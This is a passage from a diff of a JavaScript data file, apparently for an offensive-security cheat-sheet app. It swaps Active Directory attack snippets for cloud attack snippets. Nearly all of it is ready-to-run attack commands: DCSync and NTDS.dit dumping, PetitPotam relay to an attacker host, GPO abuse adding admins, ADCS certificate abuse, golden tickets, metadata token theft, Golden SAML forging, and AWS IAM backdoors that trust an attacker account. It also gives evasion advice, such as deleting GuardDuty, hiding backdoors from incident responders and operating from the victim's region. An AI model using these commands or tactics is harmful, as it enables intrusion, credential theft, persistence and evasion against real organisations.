-{t:"DCSync with Mimikatz / Impacket",l:"c#",c:"// Mimikatz:\nprivilege::debug\nlsadump::dcsync /user:corp\\krbtgt\nlsadump::dcsync /user:corp\\Administrator\nlsadump::dcsync /all /csv\n\n// Impacket (from Linux):\nsecretsdump.py corp.local/admin:password@DC_IP\nsecretsdump.py -hashes :NTLM_HASH corp.local/admin@DC_IP\n\n// Output format:\n// username:RID:LM_HASH:NT_HASH:::\n// krbtgt:502:aad3...:hash:::\n\n// DCSync rights required:\n// - Replicating Directory Changes\n// - Replicating Directory Changes All\n// - (Optional) Replicating Directory Changes in Filtered Set\n\n// Check who has DCSync rights:\nGet-DomainObjectAcl 'DC=corp,DC=local' -ResolveGUIDs |\n  ? { $_.ObjectAceType -match '1131f6aa|1131f6ad|89e95b76' }\n  # DS-Replication-Get-Changes, Get-Changes-All, Get-Changes-In-Filtered-Set\n\n// Uses DRSUAPI (port 135 + dynamic RPC)\n// Looks like normal DC replication on the wire"},
-{t:"NTDS.dit offline extraction",l:"ps",c:"# Method 1: ntdsutil (on DC)\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds\" q q\n# Creates: C:\\Temp\\ntds\\Active Directory\\ntds.dit\n#          C:\\Temp\\ntds\\registry\\SYSTEM\n\n# Method 2: VSS shadow copy\nvssadmin create shadow /for=C:\n# Copy from shadow:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS\\ntds.dit C:\\Temp\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\System32\\config\\SYSTEM C:\\Temp\\\n\n# Method 3: WMI shadow copy (remote)\n$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')\n\n# Extract offline:\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n# Or:\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL\n\n# Advantage: no DRSUAPI traffic (offline)\n# Disadvantage: requires DC filesystem access"},
-{t:"NTLM relay with PetitPotam + RBCD",l:"bash",c:"# Coerce DC to authenticate to attacker\n# Relay auth to LDAP on DC to set RBCD\n\n# Step 1: Start relay targeting LDAP\nntlmrelayx.py -t ldap://DC_IP --delegate-access --escalate-user EVIL$\n\n# Step 2: Coerce authentication from DC\npython3 PetitPotam.py ATTACKER_IP DC_IP\n# Or: SpoolSample.exe DC_IP ATTACKER_IP\n# Or: DFSCoerce.py -d corp.local -u user -p pass ATTACKER DC\n\n# Step 3: ntlmrelayx sets RBCD automatically\n# Output: EVIL$ can now impersonate to DC$\n\n# Step 4: Get service ticket\ngetST.py -spn cifs/DC.corp.local -impersonate Administrator -dc-ip DC_IP corp.local/EVIL$:Password\n\n# Step 5: Use ticket\nexport KRB5CCNAME=Administrator.ccache\nsecretsdump.py -k -no-pass corp.local/Administrator@DC.corp.local\n\n# Full chain: unauthenticated -> DA in some configs\n# Requires: LDAP signing not required (default!)"}
+C.azs=[
+{t:"Azure VM command execution",l:"az",c:"# Run command on VM (requires Contributor or VM Contributor):\naz vm run-command invoke \\\n    --resource-group RG_NAME \\\n    --name VM_NAME \\\n    --command-id RunPowerShellScript \\\n    --scripts 'whoami; hostname; ipconfig'\n\n# Or RunShellScript for Linux:\naz vm run-command invoke \\\n    --resource-group RG_NAME \\\n    --name VM_NAME \\\n    --command-id RunShellScript \\\n    --scripts 'id; hostname; cat /etc/passwd'\n\n# Custom Script Extension (more persistent):\naz vm extension set \\\n    --resource-group RG_NAME \\\n    --vm-name VM_NAME \\\n    --name CustomScriptExtension \\\n    --publisher Microsoft.Compute \\\n    --settings '{\"commandToExecute\":\"powershell -c IEX(...)\"}'\n\n# List VMs:\naz vm list --query '[].{name:name, rg:resourceGroup}' -o table\n\n# Get managed identity token from within VM:\ncurl -H 'Metadata: true' \\\n    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"}
 ];
-C.gpo=[
-{t:"SharpGPOAbuse: add immediate task",l:"c#",c:"// Requires: write access to GPO + GPO linked to target OU\n\n// Add computer startup task (runs as SYSTEM):\nSharpGPOAbuse.exe --AddComputerTask \\\n  --TaskName \"WindowsUpdate\" \\\n  --Author \"NT AUTHORITY\\\\SYSTEM\" \\\n  --Command \"cmd.exe\" \\\n  --Arguments \"/c net localgroup administrators attacker /add\" \\\n  --GPOName \"Default Domain Policy\"\n\n// Add user logon script:\nSharpGPOAbuse.exe --AddUserScript \\\n  --ScriptName \"logon.bat\" \\\n  --ScriptContents \"powershell -ep bypass -c IEX(...)\" \\\n  --GPOName \"Desktop Policy\"\n\n// Add to local admins via restricted groups:\nSharpGPOAbuse.exe --AddLocalAdmin \\\n  --UserAccount attacker \\\n  --GPOName \"Server Policy\"\n\n// Force update on target:\n// Invoke-GPUpdate -Computer TARGET -Force\n// Or wait 90 min default refresh\n\n// Check which OUs a GPO is linked to:\nGet-DomainGPO 'GPO_NAME' | select displayname,gpcfilesyspath\nGet-DomainOU -GPLink 'GPO_GUID'"},
-{t:"GPP cpassword extraction",l:"ps",c:"# Group Policy Preferences stored encrypted passwords\n# Key was published by Microsoft (MS14-025)\n# Still found in legacy environments\n\n# Search SYSVOL for cpassword:\nfindstr /S /I cpassword \\\\corp.local\\sysvol\\corp.local\\policies\\*.xml\n\n# Files to check:\n# Groups.xml (local group membership)\n# Services.xml (service accounts)\n# Scheduledtasks.xml (scheduled tasks)\n# DataSources.xml (ODBC connections)\n# Printers.xml (printer connections)\n# Drives.xml (mapped drives)\n\n# Decrypt with gpp-decrypt:\ngpp-decrypt 'ENCRYPTED_CPASSWORD_STRING'\n\n# PowerSploit:\nGet-GPPPassword\n\n# Impacket:\nGet-GPPPassword.py corp.local/user:password@DC_IP\n\n# The encryption key (published by MS):\n# 4e 99 06 e8 fc b6 6c ce 9f b8 ... (AES-256)\n# Every domain in the world uses the same key"}
+C.gcp=[
+{t:"GCP metadata and service account tokens",l:"gcp",c:"# Get access token from metadata (within GCP instance):\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'\n# Returns: {\"access_token\":\"ya29...\",\"expires_in\":3600,...}\n\n# Get service account email:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'\n\n# Get project ID:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/project/project-id'\n\n# Custom metadata (may contain secrets):\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/attributes/'\n\n# Project-wide SSH keys:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys'\n\n# Use token:\ncurl -H \"Authorization: Bearer ya29...\" \\\n    'https://www.googleapis.com/storage/v1/b?project=PROJECT_ID'"}
 ];
-C.pki=[
-{t:"Certify: find vulnerable templates",l:"c#",c:"// Enumerate all ADCS misconfigurations:\nCertify.exe find /vulnerable\n\n// Check specific template:\nCertify.exe find /ca:CORP-CA\n\n// ESC1 exploitation (SAN specification):\nCertify.exe request /ca:CORP-CA /template:VulnTemplate /altname:Administrator\n\n// Convert to PFX:\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n// Authenticate with certificate:\nRubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt\n\n// From Linux (Certipy):\ncertipy find -u user@corp.local -p password -dc-ip DC_IP\ncertipy req -u user@corp.local -p password -ca CORP-CA -template VulnTemplate -upn Administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip DC_IP\n\n// ESC4 (template ACL abuse):\n// Modify template to be ESC1 vulnerable:\n// Set CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT in msPKI-Certificate-Name-Flag\n// Then exploit as ESC1"},
-{t:"ESC8: NTLM relay to ADCS web enrollment",l:"bash",c:"# Relay NTLM auth to CA HTTP enrollment endpoint\n\n# Step 1: Start relay targeting ADCS\nntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \\\n  --adcs --template DomainController\n\n# Step 2: Coerce DC authentication\npython3 PetitPotam.py ATTACKER_IP DC_IP\n\n# Step 3: ntlmrelayx requests cert as DC machine account\n# Output: Base64-encoded certificate\n\n# Step 4: Request TGT with captured certificate\nRubeus.exe asktgt /user:DC01$ /certificate:BASE64_CERT /ptt\n\n# Step 5: DCSync with DC machine account TGT\nmimikatz # lsadump::dcsync /user:corp\\krbtgt\n\n# Full chain: PetitPotam + ESC8 = DA from unauthenticated\n# Requirements:\n# - CA has web enrollment enabled (certsrv)\n# - CA web enrollment allows NTLM\n# - Template with client auth EKU for machines\n# - LDAP signing not required for relay to LDAP variant"}
+C.fed=[
+{t:"Golden SAML with AADInternals",l:"ps",c:"# Golden SAML: forge SAML tokens after stealing signing cert\n# Requires: ADFS token-signing certificate\n\n# Export ADFS signing certificate (from ADFS server):\nExport-AADIntADFSSigningCertificate\n\n# Or extract from AD (DKM key in ADFS container):\n# mimikatz: token::elevate -> lsadump::secrets\n\n# Forge SAML token for any user:\n$cert = Import-Certificate -FilePath .\\signing.pfx\nNew-AADIntSAMLToken -ImmutableID 'USER_IMMUTABLE_ID' \\\n    -Issuer 'http://adfs.corp.com/adfs/services/trust' \\\n    -Certificate $cert \\\n    -PfxFileName .\\signing.pfx\n\n# Use forged token to access Azure/M365:\nOpen-AADIntOffice365Portal -SAMLToken $token\n\n# Or get access token:\n$at = Get-AADIntAccessTokenWithSAML -SAMLToken $token \\\n    -Resource https://graph.microsoft.com\n\n# This bypasses MFA (SAML assertion is post-authentication)\n# Valid until signing certificate is rotated"}
 ];
-C.tru=[
-{t:"Child-to-parent escalation (ExtraSIDs)",l:"c#",c:"// From child domain admin to forest root\n// Requires: child krbtgt hash + parent domain SID\n\n// Step 1: Get child krbtgt hash\nmimikatz # lsadump::dcsync /user:child\\krbtgt\n\n// Step 2: Get parent domain SID\nGet-DomainSID -Domain parent.local\n// Or: lookupsid.py child/admin@parent-dc\n\n// Step 3: Forge golden ticket with ExtraSIDs\nmimikatz # kerberos::golden /user:Administrator \\\n  /domain:child.parent.local \\\n  /sid:CHILD_DOMAIN_SID \\\n  /krbtgt:CHILD_KRBTGT_HASH \\\n  /sids:PARENT_DOMAIN_SID-519 \\\n  /ptt\n// -519 = Enterprise Admins group SID\n\n// Or with Rubeus:\nRubeus.exe golden /rc4:CHILD_KRBTGT_HASH \\\n  /domain:child.parent.local \\\n  /sid:CHILD_DOMAIN_SID \\\n  /sids:PARENT_DOMAIN_SID-519 \\\n  /user:Administrator /ptt\n\n// Step 4: Access parent DC\ndir \\\\parent-dc.parent.local\\C$\nmimikatz # lsadump::dcsync /domain:parent.local /user:krbtgt"},
-{t:"Trust key extraction and inter-realm TGT",l:"c#",c:"// Alternative: use trust key instead of krbtgt\n\n// Extract trust key from child DC:\nmimikatz # lsadump::trust /patch\n// Or: lsadump::dcsync /user:parent$\n// Output: inter-realm trust key (RC4/AES)\n\n// Forge inter-realm TGT:\nmimikatz # kerberos::golden \\\n  /domain:child.parent.local \\\n  /sid:CHILD_SID \\\n  /rc4:TRUST_KEY \\\n  /user:Administrator \\\n  /service:krbtgt \\\n  /target:parent.local \\\n  /sids:PARENT_SID-519 \\\n  /ticket:trust.kirbi\n\n// Request TGS using inter-realm TGT:\nRubeus.exe asktgs /ticket:trust.kirbi \\\n  /service:cifs/parent-dc.parent.local /dc:parent-dc /ptt\n\n// This is how Kerberos trust actually works:\n// Child TGT -> trust key -> inter-realm TGT -> parent TGS\n// We just skip asking the child KDC and forge directly"}
+C.per=[
+{t:"AWS IAM backdoor techniques",l:"aws",c:"# Method 1: New access key on existing user\naws iam create-access-key --user-name existing-admin\n# Save the AccessKeyId + SecretAccessKey\n\n# Method 2: Backdoor role trust policy\naws iam update-assume-role-policy --role-name admin-role \\\n    --policy-document '{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[{\n        \"Effect\":\"Allow\",\n        \"Principal\":{\"AWS\":\"arn:aws:iam::ATTACKER_ACCOUNT:root\"},\n        \"Action\":\"sts:AssumeRole\"\n    }]}'\n# Now attacker account can assume this role anytime\n\n# Method 3: Lambda with CloudWatch trigger\n# Deploy Lambda that re-creates your access if deleted\n# Triggered by CloudTrail event: DeleteAccessKey\n\n# Method 4: Hidden IAM user\naws iam create-user --user-name ServiceAccount-Backup-0x8f2a\naws iam attach-user-policy --user-name ServiceAccount-Backup-0x8f2a \\\n    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name ServiceAccount-Backup-0x8f2a\n\n# Method 5: SSM document for persistent access\n# Create document that calls back to C2\n# Associate with EC2 instances for persistent shell"}
 ];
 C.kit=[
-{t:"Full domain enumeration one-liner",l:"ps",c:"# Quick domain recon without BloodHound\n\nWrite-Host '=== Domain Info ===' -ForegroundColor Cyan\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\nWrite-Host '=== Domain Admins ===' -ForegroundColor Red\nGet-ADGroupMember 'Domain Admins' -Recursive | Select Name\n\nWrite-Host '=== Kerberoastable ===' -ForegroundColor Yellow\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName\n\nWrite-Host '=== AS-REP Roastable ===' -ForegroundColor Yellow\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name\n\nWrite-Host '=== Unconstrained Delegation ===' -ForegroundColor Green\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} | Select DNSHostName\n\nWrite-Host '=== LAPS Enabled ===' -ForegroundColor Green\nGet-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | ?{$_.'ms-Mcs-AdmPwdExpirationTime' -ne $null} | Select Name\n\nWrite-Host '=== Trusts ===' -ForegroundColor Cyan\nnltest /domain_trusts /all_trusts\n\nWrite-Host '=== ADCS ===' -ForegroundColor Magenta\ncertutil -config - -ping"}
+{t:"Cloud enumeration quick-start",l:"bash",c:"# === AWS ===\naws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws s3 ls\naws ec2 describe-instances --region us-east-1\naws lambda list-functions --region us-east-1\naws secretsmanager list-secrets --region us-east-1\n\n# === Azure ===\naz account show\naz account list\naz ad user list\naz ad app list\naz vm list\naz storage account list\naz keyvault list\n\n# === GCP ===\ngcloud config list\ngcloud projects list\ngcloud iam service-accounts list\ngsutil ls\ngcloud compute instances list\ngcloud functions list\ngcloud secrets list\n\n# === Multi-cloud tools ===\n# ScoutSuite (audit):\nscout --provider aws --profile stolen\nscout --provider azure --cli\nscout --provider gcp --service-account key.json\n\n# Cloudfox (attack surface):\ncloudfox aws all-checks --profile stolen\ncloudfox azure all-checks"}
 ];
 C.byp=[
-{t:"Stealthy Kerberoasting (AES + targeted)",l:"c#",c:"// Default Kerberoasting requests RC4 tickets\n// RC4 TGS requests are anomalous and detected\n\n// Stealthy: request AES256 tickets\nRubeus.exe kerberoast /enctype:aes256 /outfile:hashes.txt\n// hashcat -m 19700 (slower to crack but stealthier)\n\n// Targeted: single high-value account only\nRubeus.exe kerberoast /user:sqlsvc /enctype:aes256\n// One TGS request vs hundreds = less noise\n\n// From Linux:\nGetUserSPNs.py -request-user sqlsvc -outputfile hash.txt \\\n  corp.local/user:password\n\n// opsec considerations:\n// - Request AES not RC4 (4769 event shows enctype)\n// - Target specific accounts, not all SPNs\n// - Space requests over time (not all at once)\n// - Use existing session (don't authenticate fresh)\n// - ETYPE 0x12 (AES256) vs 0x17 (RC4) in logs"},
-{t:"BOF-based enumeration (avoid PowerShell logging)",l:"c#",c:"// Beacon Object Files run in beacon process\n// No PowerShell = no ScriptBlock logging\n// No fork+run = no new process\n\n// BOF alternatives to PowerView:\n// ADSearch BOF:\ninline-execute ADSearch.exe --search \"(servicePrincipalName=*)\" --attributes samaccountname,servicePrincipalName\n\n// LDAP query BOF:\nldapsearch (objectClass=user)(adminCount=1)\n\n// Net module BOF (replaces net.exe):\nnet_dclist\nnet_group \"Domain Admins\"\nnet_localgroup \\\\target Administrators\n\n// Kerberos BOF:\ninline-execute Rubeus.exe kerberoast /user:sqlsvc\n\n// Benefits:\n// - No PowerShell logging (4103, 4104)\n// - No new process creation (4688)\n// - Runs in beacon memory\n// - No AMSI interaction\n// - No command-line arguments logged"}
+{t:"GuardDuty evasion techniques",l:"aws",c:"# GuardDuty detects:\n# - API calls from known bad IPs (Tor, VPN)\n# - Credential use from unusual geographies\n# - Reconnaissance API calls (ListUsers, etc.)\n# - Crypto mining behavior\n# - DNS-based data exfiltration\n\n# Evasion strategies:\n\n# 1. Use stolen creds from same region as victim\n#    (avoids geo-anomaly detection)\n\n# 2. Use an EC2 instance within the VPC for recon\n#    (internal traffic not flagged by some findings)\n\n# 3. Slow enumeration (avoid rate-based detections)\n#    Add sleep between API calls\n\n# 4. Use existing IAM entities, don't create new ones\n#    New user creation triggers alerts\n\n# 5. Avoid known GuardDuty finding patterns:\n#    - Don't use Tor/known VPN exit IPs\n#    - Don't call rarely-used APIs in rapid succession\n#    - Don't access metadata from unusual processes\n\n# 6. If you have admin access (nuclear option):\naws guardduty delete-detector --detector-id DETECTOR_ID\n# Extremely noisy, last resort only"}
 ];
 return C[s]||[];
 }
 var TR={
-enu:[
-{t:"BloodHound DCOnly is stealthiest",d:"SharpHound -c DCOnly queries only domain controllers via LDAP. No SMB connections to workstations/servers. Misses local admin sessions but avoids triggering host-based detections."},
-{t:"LDAP queries beat PowerView for stealth",d:"Raw LDAP queries via DirectorySearcher or ldapsearch generate minimal telemetry. PowerView imports a module (logged), runs cmdlets (logged), and may trigger AMSI."},
-{t:"Loop session collection catches transient logins",d:"Sessions are ephemeral. A single SharpHound run may miss where DA logged in yesterday. Loop mode re-collects sessions over hours to build complete picture."},
-{t:"PingCastle for quick-win assessment",d:"PingCastle gives you a security score and highlights the worst misconfigurations in minutes. Great for prioritizing which attack paths to explore first."}
+aim:[
+{t:"enumerate-iam before anything else",d:"Stolen AWS keys? Run enumerate-iam.py immediately. It brute-forces every API call to map your exact permissions. Don't guess what you can do."},
+{t:"IAM has ~20 privesc paths",d:"Rhino Security documented 20+ IAM privilege escalation methods. CreatePolicyVersion, AttachUserPolicy, PutRolePolicy, PassRole+Lambda, etc. Pacu automates detection."},
+{t:"Access keys never expire by default",d:"Unlike STS temp creds, IAM access keys live forever unless rotated. One leaked key = persistent access until discovered. Check GitHub, .env files, CI/CD logs."},
+{t:"Role chaining can cross accounts",d:"AssumeRole can target roles in other AWS accounts if the trust policy allows it. One compromised account may lead to the entire organization."}
 ],
-krb:[
-{t:"Kerberoast AES to avoid detection",d:"RC4 TGS requests (etype 0x17) are anomalous in modern AD. Request AES256 (etype 0x12) to blend with normal traffic. Harder to crack but much stealthier."},
-{t:"Diamond Ticket >> Golden Ticket",d:"Golden Tickets are forged from scratch and may fail PAC validation. Diamond Tickets modify a real TGT, passing all validation checks. Worth the extra complexity."},
-{t:"AS-REP roast needs zero creds",d:"You can AS-REP roast from an unauthenticated position if you have a list of usernames. Combine with username enumeration via Kerberos error messages."},
-{t:"RBCD only needs write on computer object",d:"No Domain Admin needed. If you can write to any computer's msDS-AllowedToActOnBehalfOfOtherIdentity, you can impersonate any user to that computer's services."},
-{t:"Unconstrained + coercion = DC TGT",d:"If you compromise a host with unconstrained delegation, coerce the DC to authenticate to it (PetitPotam/PrinterBug). The DC's TGT is captured in memory."}
+aws:[
+{t:"SSRF to metadata = full account compromise",d:"Any SSRF vulnerability on an EC2 instance with an IAM role can steal temporary credentials from the metadata service. IMDSv2 mitigates simple GETs but not all SSRF."},
+{t:"User-data scripts contain secrets",d:"EC2 user-data (startup scripts) often hardcode passwords, API keys, and bootstrap tokens. Readable from metadata: curl .../latest/user-data. Check every instance."},
+{t:"Terraform state files are gold",d:"terraform.tfstate in S3 contains every resource output including secrets, passwords, and connection strings. Often in a bucket with overly permissive access."},
+{t:"Lambda environment variables leak secrets",d:"get-function-configuration returns environment variables in cleartext. DB passwords, API keys, encryption keys commonly stored here. Check every Lambda."}
 ],
-acl:[
-{t:"BloodHound finds ACL paths humans miss",d:"Manual ACL enumeration is nearly impossible in large environments. BloodHound's graph analysis finds multi-hop chains: user -> group -> GPO -> OU -> target."},
-{t:"WriteDACL is as good as GenericAll",d:"WriteDACL lets you grant yourself GenericAll. Two operations instead of one, but the end result is identical. Often overlooked in manual audits."},
-{t:"Shadow Credentials are stealthier than password reset",d:"ForceChangePassword locks out the real user immediately. Shadow Credentials add a key without changing the password. The user notices nothing."},
-{t:"Clean up ACL changes after exploitation",d:"Remove-DomainObjectAcl to undo your changes. ACL modifications are logged in 5136 events. Leaving them in place extends your exposure window."}
+eid:[
+{t:"App registrations are the AD equivalent of service accounts",d:"Over-permissioned app registrations with client secrets are everywhere. Mail.ReadWrite.All, User.ReadWrite.All, Directory.ReadWrite.All = tenant admin equivalent."},
+{t:"Global Admin can elevate to Azure subscription Owner",d:"Entra Global Admin doesn't automatically have Azure access. But one toggle in the Portal gives User Access Administrator at root scope = Owner on everything."},
+{t:"PRT is the cloud equivalent of a Kerberos TGT",d:"Primary Refresh Tokens on hybrid-joined devices enable SSO to all Azure/M365 services. Extract with Mimikatz or ROADtoken for persistent cloud access."},
+{t:"Managed Identity tokens from metadata",d:"Same 169.254.169.254 concept as AWS. Any code execution on an Azure VM/Function with managed identity gives you an access token. No credentials needed."}
 ],
-crd:[
-{t:"DCSync looks like normal replication",d:"DRSUAPI is the standard replication protocol. Without specific monitoring (4662 events + DS-Replication-Get-Changes GUID), DCSync is indistinguishable from normal DC-to-DC replication."},
-{t:"nanodump over Mimikatz for LSASS",d:"nanodump uses direct syscalls, avoids well-known Mimikatz signatures, and can dump LSASS with minimal footprint. Parse the dump offline with pypykatz."},
-{t:"NTDS.dit offline avoids DRSUAPI detection",d:"If DCSync is monitored, use ntdsutil or VSS shadow copy to extract NTDS.dit. Requires DC filesystem access but generates no replication traffic."},
-{t:"Credential relay chains are powerful",d:"PetitPotam + NTLM relay to LDAP + RBCD = DA from unauthenticated in many default configurations. The most impactful attack chain in modern AD."}
+azs:[
+{t:"Run Command = remote code execution",d:"az vm run-command invoke is RCE-as-a-service. Contributor role on a resource group with VMs = code execution on every VM. Often overlooked in access reviews."},
+{t:"ARM template parameters store secrets",d:"Deployment history retains template parameters including passwords. secureString is supposed to protect them, but deployment outputs and linked templates may leak."},
+{t:"Key Vault access policies are separate from RBAC",d:"A user might have no Azure RBAC permissions but still be in a Key Vault access policy. Always check both access control mechanisms."},
+{t:"Storage account keys = full access",d:"Two storage account keys provide unlimited access to all containers and blobs. No audit trail per-operation. Rotate immediately if leaked."}
 ],
-gpo:[
-{t:"Immediate scheduled tasks execute fast",d:"GPO-deployed immediate scheduled tasks run on next policy refresh (~90 min) or gpupdate /force. Unlike startup scripts, they don't require reboot."},
-{t:"GPP cpassword is still found everywhere",d:"Despite MS14-025 (2014), legacy GPP files with encrypted passwords persist in SYSVOL. The encryption key is publicly known. Always check."},
-{t:"Check GPO write permissions via BloodHound",d:"BloodHound maps GPO -> OU -> Computer relationships. If you can write a GPO linked to a high-value OU, you can execute code on every computer in that OU."},
-{t:"Clean up GPO modifications after use",d:"GPO changes are visible in Group Policy Management Console. Revert ScheduledTasks.xml and other modifications. Leave no persistent backdoor in production GPOs."}
+gcp:[
+{t:"Default service accounts are overly permissive",d:"The default compute service account has Project Editor role. Any code execution on a default GCP VM = near-admin access to the entire project."},
+{t:"Service account keys never expire",d:"JSON key files are valid forever unless explicitly deleted. One leaked key = persistent access. Check source code repos and CI/CD systems."},
+{t:"Project-wide SSH keys in metadata",d:"GCP allows SSH keys in project metadata that grant access to ALL instances in the project. One metadata write = SSH to every VM."},
+{t:"iam.serviceAccounts.getAccessToken is god-mode",d:"This permission lets you generate an access token for ANY service account in the project. Equivalent to having every service account's credentials."}
 ],
-pki:[
-{t:"ADCS ESC1 is the most common critical finding",d:"Misconfigured certificate templates with ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU + low-priv enrollment = instant DA. Found in majority of engagements."},
-{t:"Certificates survive password changes",d:"Once you have a certificate, it's valid for the template's validity period (often 1-2 years). Password changes don't invalidate it. Excellent persistence."},
-{t:"ESC8 is unauthenticated to DA",d:"PetitPotam coercion + NTLM relay to ADCS web enrollment = certificate as DC machine account = DCSync. No credentials needed at all in default configs."},
-{t:"Shadow Credentials via msDS-KeyCredentialLink",d:"Add your public key to the target's KeyCredentialLink. Authenticate via PKINIT. No password change, survives rotation, minimal forensic footprint. One of the stealthiest attacks."},
-{t:"Golden certificate = forge any cert",d:"If you get the CA private key, you can forge certificates for any user indefinitely. Like Golden Ticket but for PKI. Survives krbtgt rotation."}
+fed:[
+{t:"Golden SAML persists until cert rotation",d:"ADFS token-signing certificates are rarely rotated. Once stolen, you can forge SAML tokens indefinitely. This was the SolarWinds technique."},
+{t:"OIDC federation trusts are often too broad",d:"GitHub Actions OIDC to AWS may trust 'repo:org/*' instead of a specific repo. Any repo in the org can assume the AWS role."},
+{t:"Tokens are usually not IP-bound",d:"Cloud access tokens (AWS STS, Azure JWT, GCP OAuth) work from any IP by default. Steal a token and use it from your own infrastructure."},
+{t:"On-prem compromise often leads to cloud",d:"Azure AD Connect sync accounts, ADFS signing certs, and hybrid-joined device PRTs all bridge from on-prem AD to cloud. Compromise AD = compromise cloud."}
 ],
-tru:[
-{t:"SID filtering is NOT enforced intra-forest",d:"Parent-child and tree-root trusts within a forest do not filter SIDs. ExtraSIDs in golden tickets always work for intra-forest escalation. This is by design."},
-{t:"One child domain compromise = entire forest",d:"Due to no SID filtering within forests, compromising any child domain's krbtgt hash grants Enterprise Admin access to the entire forest."},
-{t:"Trust keys are extractable via DCSync",d:"Trust keys can be obtained by DCSyncing the trust account (e.g., parent$) from the child DC. No need for lsadump::trust /patch on the DC directly."},
-{t:"Cross-forest attacks are limited but possible",d:"SID filtering blocks ExtraSIDs across forests. But: shared applications, ADCS cross-enrollment, Kerberos delegation, and SQL linked servers may still provide paths."}
+per:[
+{t:"Modify existing resources over creating new",d:"Creating a new IAM user or role triggers alerts. Adding a key to an existing user or adding a trust to an existing role is much harder to detect."},
+{t:"Event-triggered self-healing persistence",d:"Lambda triggered by CloudTrail DeleteAccessKey event that re-creates your access. Cleanup efforts automatically trigger re-compromise."},
+{t:"Azure federated credentials need no secret",d:"Federated credentials on app registrations allow authentication without client secrets. Harder to detect because there's no secret to find or rotate."},
+{t:"Tag resources to blend with environment",d:"Name your backdoor resources to match existing patterns. ServiceAccount-Backup, lambda-monitoring-prod, etc. Make IR teams scroll past them."}
 ],
 kit:[
-{t:"Follow the BloodHound shortest path first",d:"BloodHound's shortest path algorithm finds the minimum-hop route to DA. Start there. Don't waste time on complex chains when a 2-hop path exists."},
-{t:"Phase your attack: no-priv first",d:"Kerberoasting and AS-REP roasting need only a domain user. Try these before attempting privilege-required attacks. Cracked passwords may give you a shortcut."},
-{t:"Mark owned nodes in BloodHound",d:"Right-click -> Mark as Owned. Then query 'Shortest Path from Owned Principals' to see new attack paths that opened up with each compromise."},
-{t:"Certify/Certipy before anything else",d:"ADCS misconfigurations are so common and so impactful that running Certify.exe find /vulnerable should be standard in the first 5 minutes of any engagement."}
+{t:"Start with sts get-caller-identity",d:"Always verify who you are first. The identity, account, and ARN tell you exactly what you're working with. Then enumerate permissions methodically."},
+{t:"ScoutSuite gives a security posture overview",d:"Run ScoutSuite early for a bird's-eye view of misconfigurations. It checks CIS benchmarks and highlights the worst findings. Great for target prioritization."},
+{t:"Cloudfox maps attack surface automatically",d:"Cloudfox specifically looks for offensive paths: assumable roles, exposed secrets, overpermissioned Lambda, public S3, etc. Complements ScoutSuite."},
+{t:"ROADtools is essential for Azure tenants",d:"roadrecon gather + gui gives you a full searchable dump of the Entra ID tenant. App permissions, role assignments, conditional access gaps, everything."}
 ],
 byp:[
-{t:"BOF over PowerShell always",d:"Beacon Object Files run in the beacon process with no PowerShell, no AMSI, no new process, no command-line logging. BOF equivalents exist for most offensive tools."},
-{t:"AES Kerberoasting is the new default",d:"RC4 ticket requests are trivially detected. AES256 Kerberoasting blends with normal traffic and avoids most detection rules. Accept the slower cracking time."},
-{t:"Protected Users doesn't stop everything",d:"Kerberoasting works if the account has an SPN. ADCS certificate auth is unaffected. Already-cached tickets are still usable. It's good defense but not complete."},
-{t:"Watch for honeypot accounts",d:"Fake SPN accounts, fake DA accounts, and decoy shares are common. Look for accounts with recent password changes, unusual SPNs, or too-good-to-be-true permissions."}
+{t:"CloudTrail doesn't log everything",d:"S3 data events (GetObject) require explicit configuration. Many accounts only log management events. Your S3 exfil may not appear in logs at all."},
+{t:"GuardDuty is geography-aware",d:"Using stolen creds from a different continent triggers findings. Operate from the same region as the victim. Use an EC2 instance within their VPC if possible."},
+{t:"Sentinel has coverage gaps based on cost",d:"Azure Sentinel ingests logs that cost money. Many orgs skip expensive log sources. Function App logs, Storage Analytics, and detailed Graph audit may not be collected."},
+{t:"SCP bypass via management account",d:"Service Control Policies don't apply to the management account. If you compromise the org management account, SCPs are irrelevant. This is by design."}
 ]
 };
 function render(){
 var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
 var codes=getCodes(S.s),tricks=TR[S.s]||[];
 var flow='';
-if(S.s==='enu')flow=fENU();else if(S.s==='krb')flow=fKRB();else if(S.s==='acl')flow=fACL();
-else if(S.s==='crd')flow=fCRD();else if(S.s==='gpo')flow=fGPO();else if(S.s==='pki')flow=fPKI();
